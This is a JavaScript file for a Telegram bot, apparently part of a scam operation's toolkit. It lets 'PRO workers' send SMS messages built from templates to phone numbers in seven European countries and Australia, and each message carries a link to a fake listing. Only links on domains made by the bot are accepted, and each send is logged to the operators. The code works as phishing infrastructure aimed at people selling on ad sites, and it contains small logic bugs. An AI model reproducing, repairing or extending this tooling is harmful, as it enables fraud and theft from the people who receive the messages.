const WizardScene = require("telegraf/scenes/wizard");
const linkify = require("linkifyjs");
const { Markup } = require("telegraf");
const { Service } = require("../database");
const { default: axios } = require("axios");
const escapeHTML = require("escape-html");
const log = require("../helpers/log");
const locale = require("../locale.js");
const instruments = require("../commands/instruments");
const parsePhoneNumber = require("libphonenumber-js");
const config = require("../config/index");

const scene = new WizardScene(
  "send_sms",
  async (ctx) => {
    try {
      if (ctx.state.user.status == 0) {
        await ctx.reply("❌ Для отправки смс Вы должны быть ПРО воркером").catch((err) => err);
        return ctx.scene.leave();
      }
      await ctx.scene.reply("📲 <b>Введите номер телефона</b>", {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("Отменить", "cancel")]]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();
      var text = ctx.message.text;
      if (text[0] != "+") text = "+" + text;

      var phoneNumber;
      try {
        phoneNumber = parsePhoneNumber(text, "");
        if (phoneNumber == undefined) return ctx.wizard.prevStep();
      } catch (e) {
        return ctx.wizard.prevStep();
      }

      if (
        phoneNumber.country == "AU" ||
        phoneNumber.country == "DE" ||
        phoneNumber.country == "ES" ||
        phoneNumber.country == "IT" ||
        phoneNumber.country == "PL" ||
        phoneNumber.country == "RO" ||
        phoneNumber.country == "UK"
      ) {
        ctx.scene.state.data.country = phoneNumber.country;
        ctx.scene.state.data.number = phoneNumber.number.replace(/\D+/g, "");
        await ctx.scene.reply("🔗 <b>Введите ссылку на объявление</b>", {
          reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("Отменить", "cancel")]]),
          parse_mode: "HTML",
        });
        return ctx.wizard.next();
      } else {
        await ctx
          .replyOrEdit("❌ <b>В настоящее время отправка смс на телефон этой страны невозможна</b>", { parse_mode: "HTML" })
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }
    } catch (err) {
      console.log(err);
      ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();

      try {
        new URL(ctx.message.text);
      } catch (err) {
        await ctx.replyOrEdit("❌ <b>Введите валидную ссылку</b>", { parse_mode: "HTML" }).catch((err) => err);
        return ctx.wizard.prevStep();
      }

      var url = linkify.find(ctx.message.text).filter((v) => v.type == "url");
      const domains = (await Service.findAll()).map((v) => v.domain);
      var regexp = new RegExp(`(${domains.join("|")})`, "gui");
      if (url.filter((v) => !regexp.test(v.value)).length >= 1) {
        await ctx
          .reply("❌ <b>Вы можете использовать только те ссылки, которые созданны в нашем боте</b>", { parse_mode: "HTML" })
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }

      await ctx.scene.reply("<b>Ожидайте...</b>", {
        parse_mode: "HTML",
      });

      ctx.scene.state.data.link = url[0].value;
      var templates = await axios.get(`https://sender.getsms.shop/templates?country=${ctx.scene.state.data.country}`);
      templates = templates.data.filter((el) => !el.message.includes("{{order_id}}") || !el.message.includes("{{fio}}"));
      ctx.scene.state.data.templates = templates;

      var text = "📚 <b>Выберите шаблон ниже и отправьте его номер:</b>\n";
      for (let i = 0; i < templates.length; i++) {
        text += `\n${i + 1}. ${templates[i].message}`;
      }

      await ctx.scene.reply(text, {
        parse_mode: "HTML",
      });
      return ctx.wizard.next();
    } catch (err) {
      ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();
      if (parseInt(ctx.message.text) == NaN) return ctx.wizard.prevStep();
      const templateNumber = parseInt(ctx.message.text) - 1;
      if (templateNumber > ctx.scene.state.data.templates.length - 1 || templateNumber <= 0) return ctx.wizard.prevStep();

      await ctx.scene.reply("⏳ <b>Отправляем СМС...</b>", {
        parse_mode: "HTML",
      });

      const result = await axios.get(
        `https://sender.getsms.shop/send?key=${config.SMS_TOKEN}&number=${ctx.scene.state.data.number}&template_id=${ctx.scene.state.data.templates[templateNumber].id}&link=${ctx.scene.state.data.link}`
      );

      if (result.data.ok !== true) {
        await ctx.scene.reply("❌ <b>Не удалось отправить СМС!</b>", { parse_mode: "HTML" }).catch((err) => err);
      } else {
        await ctx.scene.reply("✅ <b>СМС отправлено!</b>", { parse_mode: "HTML" }).catch((err) => err);
        await log(ctx, `Отправил СМС на номер +${ctx.scene.state.data.number} с ссылкой ${ctx.scene.state.data.link}`);
      }
    } catch (err) {
      console.log(err);
      ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
    return ctx.scene.leave();
  }
);

// encodeURI(text)

scene.leave(instruments);

module.exports = scene;
